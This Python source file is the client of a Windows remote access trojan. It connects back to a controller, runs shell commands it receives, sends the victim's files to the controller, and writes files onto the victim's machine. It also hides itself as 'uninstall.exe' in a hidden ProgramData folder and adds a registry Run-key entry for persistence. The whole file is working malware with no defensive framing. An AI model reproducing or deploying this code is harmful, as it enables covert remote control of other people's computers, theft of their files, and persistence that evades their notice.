import socket, time, threading, subprocess, os, sys
from sys import executable, exit
from shutil import copy, move
from subprocess import Popen, PIPE, call

# values
sv_ip = '127.0.0.1'
sv_port = 3223
retry_delay_connect = 5
password = 'change_me'
default_name = 'Slave_t3st'

base_name = os.path.basename(sys.executable)
base_dir = sys.executable.replace('\\' + base_name, '')


# Thread 1 be sure to always ready and connected

# get ready (copy file and melt in)
def get_ready():
    start = os.getcwd()
    file_before = executable
    if file_before == 'C:\\ProgramData\\$Recycle\\uninstall.exe':
        pass
    else:
        if 'ProgramData' in os.listdir('C:\\'):
            pass
        else:
            os.mkdir('C:\\ProgramData')
            os.system('echo off && attrib +s +h C:\ProgramData ')
        if '$Recycle' in os.listdir("C:\\ProgramData"):
            pass
        else:
            os.mkdir('C:\\ProgramData\\$Recycle')
            call('echo off && attrib +s +h C:\\ProgramData\\$Recycle',shell=True)
        if 'uninstall.exe' in os.listdir('C:\\ProgramData\\$Recycle\\'):
            call('del /F C:\\ProgramData\\$Recycle\\uninstall.exe', shell=True)
        move(file_before, 'C:\\ProgramData\\$Recycle\\uninstall.exe')
        os.chdir('C:\\ProgramData\\$Recycle')
        call("reg add HKCU\Software\Microsoft\windows\CurrentVersion\Run /v svgasus /t REG_SZ /d C:\ProgramData\$Recycle\\uninstall.exe /f", shell=True)
        os.startfile('C:\\ProgramData\\$Recycle\\uninstall.exe')
        exit(0)
# melt check option
def melt_func(command):
    if command == 'check':
        output = Popen("reg query HKCU\Software\Microsoft\Windows\Currentversion\Run /f svgasus", shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
        output = output.stdout.read().decode()
        if 'svgasus' in output:
            return '\nIts melted in the slave registry\n'
        else:
            return '\n Its disabled in this slave\n'
    elif command == 'start':
        output = Popen("reg add HKCU\Software\Microsoft\windows\CurrentVersion\Run /v svgasus /t REG_SZ /d C:\\ProgramData\\$Recycle\\uninstall.exe /f", shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
        msg = '\n[Started] '
        return msg
    elif command == 'stop':
        output = Popen("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v  svgasus", shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
        msg = '\n[Stopped] '
        return msg
    else:
        return '\nfatal error i think its in send and receive'

# connect
def connect(sv_ip, sv_port, password, default_name):
    name = name_finder()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((sv_ip, sv_port))
        intro = password + ' join ' + name
        s.send(intro.encode())
        return s

    except:
        time.sleep(retry_delay_connect)
        connect(sv_ip, sv_port, password, name)


# file reciver
def recv_file(old_sock, password, path, file_name):
    try:
        z = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        z.connect((sv_ip, sv_port))
        intro = password + ' want_get ' + path
        z.send(intro.encode())
        f = open(base_dir + '\\' + file_name, 'wb')
        total_size = 0
        chunk_number = 1
        num_of_try = 10
        z.settimeout(3)
        while True:
            try:
                chunk = z.recv(1024)
                if chunk != ''.encode():
                    f.write(chunk)
                    total_size += len(chunk)
                    chunk_number += 1
                    num_of_try = 10
                else:
                    msg = 'Uploading is Done Slave recved: ' + str(total_size) + ' bytes'
                    old_sock.send(msg.encode())
                    f.close()
                    break

            except:
                num_of_try -= 1
                if num_of_try == 0:
                    break
    except:
        pass


# upload to master
def uploader(old_sock, p4ssword, path):
    try:
        z = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        z.connect((sv_ip, sv_port))
        intro = password + ' want_send ' + path
        z.send(intro.encode())
        z.settimeout(3)
        answer = z.recv(1024).decode()
        if answer == 'fine':
            size = 0
            f = open(path, 'rb')
            while True:
                try:
                    temp_chunk = f.read(1024)
                    size += len(temp_chunk)
                    if temp_chunk == ''.encode():
                        z.close()
                        f.close()
                        msg = '\nsent ' + str(size) + ' bytes(make sure recved it all)'
                        old_sock.send(msg.encode())
                        break
                    else:
                        z.send(temp_chunk)
                except:
                    f.close()
                    z.close()
                    break
        else:
            pass
    except:
        pass


# cmd detector
def cmd_detector(cmd, s):
    if cmd == ('be dead ' + password):
        s.close()
        exit()
    elif 'rename' in cmd:
        old_name = default_name
        new_name = cmd.replace('rename ', '')
        name_file = open(base_dir + '\\SFN.name', 'w')
        name_file.write(new_name)
        name_file.close()
        listener()

    elif 'send' in cmd:
        try:
            path = cmd.replace('send ', '').split()[0]
            file_name = cmd.replace('send ', '').split()[1]
            download_thread = threading.Thread(target=recv_file(s, password, file_name, path))
            download_thread.daemon = True
            download_thread.start()
        except:
            s.send('failed in starting file download'.encode())

    elif 'recv' in cmd:
        path = cmd.split()[1]
        uploader_thread = threading.Thread(target=uploader(s, password, path))
        uploader_thread.daemon = True
        uploader_thread.start()

    elif 'melt' in cmd:
        cmd = cmd.replace('melt ', '')
        answer = melt_func(cmd)
        s.send(answer.encode())
    # system commands
    else:
        if cmd == 'pwd':
            cmd = 'echo %cd%'
        elif cmd == 'home':
            os.chdir(base_dir)
            cmd = 'echo ' + os.getcwd()
        elif 'cd' == cmd[0:2]:
            os.chdir(cmd[3:])
            cmd = 'echo %cd%'
        elif 'cat' == cmd[0:3]:
            cmd = 'type ' + cmd[4:]
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        while True:
            p_back = p.stdout.read() + p.stderr.read()
            if p_back == ''.encode():
                return ' '
            else:
                return p_back


# name finder
def name_finder():
    if 'SFN.name' in os.listdir(base_dir):
        pass
    else:
        f = open(base_dir + '\\SFN.name', 'w')
        f.write(default_name)
        f.close()
    f = open(base_dir + '\\SFN.name', 'r')
    name = f.read()
    f.close()
    return name


# main listener
def listener():
    thename = name_finder()
    s = connect(sv_ip, sv_port, password, thename)
    if s == None:
        listener()
    while True:
        if 1 == 1:
            try:
                s.settimeout(retry_delay_connect)
                msg = s.recv(1024).decode()
                if 'ping' == msg:
                    s.send('pong'.encode())
                    s.settimeout(None)
                else:
                    cmd = msg
                    answer = cmd_detector(cmd, s)
                    if answer == ' ':
                        s.send(' '.encode())
                    elif answer == None:
                        pass
                    else:
                        try:
                            s.send(answer)
                        except:
                            pass
            except socket.error as err:
                if str(err) == '[WinError 10054] An existing connection was forcibly closed by the remote host':
                    time.sleep(retry_delay_connect)
                    listener()

# main spinner
# for melting(start up function) and make hidden directory remove # from get_ready()
# get_ready()
listener()
